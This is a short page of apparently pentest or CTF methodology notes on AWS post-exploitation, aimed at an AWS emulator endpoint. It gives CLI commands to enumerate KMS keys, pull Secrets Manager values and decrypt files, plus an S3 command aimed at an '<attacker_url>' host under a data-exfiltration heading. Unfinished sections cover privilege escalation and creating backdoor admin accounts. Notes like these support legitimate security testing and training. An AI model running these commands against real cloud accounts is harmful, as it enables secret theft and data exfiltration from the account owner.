# 04 - Post Exploitation

## Enumeration

### Authenticated Enumeration

```
$ aws [--endpoint-url=http://<IP>:4566] kms list-keys

$ aws [--endpoint-url=http://<IP>:4566] secretsmanager list-secrets

$ aws [--endpoint-url=http://<IP>:4566] secretsmanager get-secret-value --secret-id "<arn_ID>"
```

## Privilege Escalation

TODO: Write conditions to escalate to gain full control of the s3 bucket servers

## Credential Access and Dumping

Decrypt the file with a master key.

```
$ aws kms decrypt [--endpoint-url=http://<IP>:4566] --ciphertext-blob fileb:///path/to/file.enc --query Plaintext --output text
```

Find the key

```
$ aws kms decrypt [--endpoint-url=http://<IP>:4566] --ciphertext-blob fileb:///path/to/file.enc --query Plaintext --output text --key-id=<Key_ID> 
```

Decrypt the file with a supported encryption algorithm.

```
$ aws kms decrypt [--endpoint-url=http://<IP>:4566] --ciphertext-blob fileb:///path/to/file.enc --query Plaintext --output text --key-id=<Key_ID> --encryption-algorithm <encryption_algorithm>
```

## Data Exfiltration

TODO: Setup MinIO on a server to exflitrate s3 bucket instances and write conditions before executing this phase

```
$ aws s3 --endpoint=http[s]://<attacker_url> --no-sign-request --recursive ls s3://<s3_bucket_IP>
```

## Maintaining Access

TODO: Provide steps for creating user accounts with admin access

---
## References

- [Privilege Escalation in AWS - Part 01](https://mystic0x1.github.io/posts/AWS-Privilege-Escalation-Part-01/)

- [Privilege Escalation in AWS - Part 02](https://mystic0x1.github.io/posts/AWS-Privilege-Escalation-Part-02/)

- [Methods to Backdoor an AWS Account](https://mystic0x1.github.io/posts/methods-to-backdoor-an-aws-account/)

- [MinIO](https://min.io)

- [minio-backup-s3](https://github.com/fandoghpaas/minio-backup-s3)